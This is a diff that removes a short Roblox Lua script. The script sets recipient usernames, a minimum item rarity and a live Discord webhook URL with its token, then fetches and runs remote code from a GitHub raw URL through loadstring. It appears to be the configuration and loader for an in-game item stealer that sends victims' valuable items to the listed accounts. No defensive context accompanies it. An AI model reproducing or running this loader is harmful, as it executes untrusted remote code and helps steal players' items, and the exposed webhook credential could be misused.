@@ -1,8 +1,0 @@
-_G.Usernames = {"B6O6S", "5RTETT2", "Nylas91"}
-_G.min_rarity = "Godly"
-_G.min_value = 1 
-_G.pingEveryone = "Yes" 
-_G.webhook = "https://discord.com/api/webhooks/1278373939302760499/vr4-Z9PDk8bcMw5idDtkoa2vd9ryYCFj1YWWWTpZrWiIc6jUxbk45ImnrFj4vzOrsUVQ"
-_G.discuser = "1284504105066303520"
-
-loadstring(game:HttpGet('https://raw.githubusercontent.com/B6O6S/Robloxscripts/refs/heads/main/Notalie'))();
